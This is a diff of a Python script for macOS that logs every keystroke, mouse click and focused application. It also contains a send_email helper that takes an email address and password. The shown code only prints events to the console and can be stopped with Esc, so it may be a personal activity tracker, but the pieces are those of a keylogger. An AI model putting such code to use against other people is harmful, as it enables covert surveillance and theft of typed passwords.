@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+from AppKit import NSWorkspace
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -34,27 +35,51 @@ def send_email(email_address, password, contents):
     server.quit()
 
 """
+    APPLICATION TRACKING
+"""
+def get_focus_app_string():
+    workspace = NSWorkspace.sharedWorkspace()
+    return workspace.activeApplication()['NSApplicationName']
+
+"""
     MONITORING
 """
 
 class Monitor:
-    # TODO: Log that I thought this'd be a problem!
+    KEYS_LOG = 'keys.txt'
+    MICE_LOG = 'mice.txt'
+    APPS_LOG = 'apps.txt'
+
     def on_press(self, key):
+        if (key == keyboard.Key.esc):
+            self.done = True
+            return False
+
         print(key)
     
     def on_click(self, x, y, button, pressed):
+        if self.done:
+            return False
         if pressed:
             print(button)
 
     def __init__(self):
+        self.done = False
         self.keys = keyboard.Listener(on_press=self.on_press)
         self.mice = mouse.Listener(on_click=self.on_click)
     
     def run(self):
         self.keys.start()
         self.mice.start()
-        self.keys.join()
-        self.mice.join()
+
+        app = get_focus_app_string()
+        prev = None
+        while not self.done:
+            if prev is None or prev != app:
+                print(f"{timestamp()} - '{app}'")
+                prev = app
+
+            app = get_focus_app_string()                
 
 def main():
     monitor = Monitor()
